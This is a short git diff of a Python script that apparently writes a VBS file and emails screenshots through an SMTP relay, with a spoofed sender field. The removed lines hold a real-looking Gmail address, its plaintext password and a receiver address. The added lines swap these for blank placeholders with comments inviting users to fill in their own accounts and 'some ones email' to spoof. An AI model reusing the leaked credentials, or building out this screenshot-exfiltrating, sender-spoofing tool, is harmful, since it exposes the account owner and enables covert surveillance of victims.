@@ -40,11 +40,11 @@ z = 52226481
 time.sleep(0)
 time.sleep(0)
 time.sleep(0)
-email_sender = 'evildev360@gmail.com'
-email_password = 'pcWrT2fLk6N19Byw'
-email_receiver = "rusiruthamarakaluarachchi@gmail.com"
+email_sender = ''#your email
+email_password = ''#email pass
+email_receiver = "" #your email
 email_subject = "hi"
-spoof_email = "evildev360@gmail.com"
+spoof_email = ""#some ones email
 s = x+y
 time.sleep(0)
 time.sleep(0)
@@ -94,11 +94,11 @@ with open(vbs_path, "w") as f:
 
 
 
-email_sender = 'evildev360@gmail.com'
-email_password = 'pcWrT2fLk6N19Byw'
-email_receiver = "rusiruthamarakaluarachchi@gmail.com"
+email_sender = '' #your email
+email_password = ''#your email password
+email_receiver = "" #your email
 email_subject = "Screenshot"
-spoof_email = "evildev360@gmail.com"
+spoof_email = "" #spoof email
 smtp_server = 'smtp-relay.sendinblue.com'
 smtp_port = 587
 
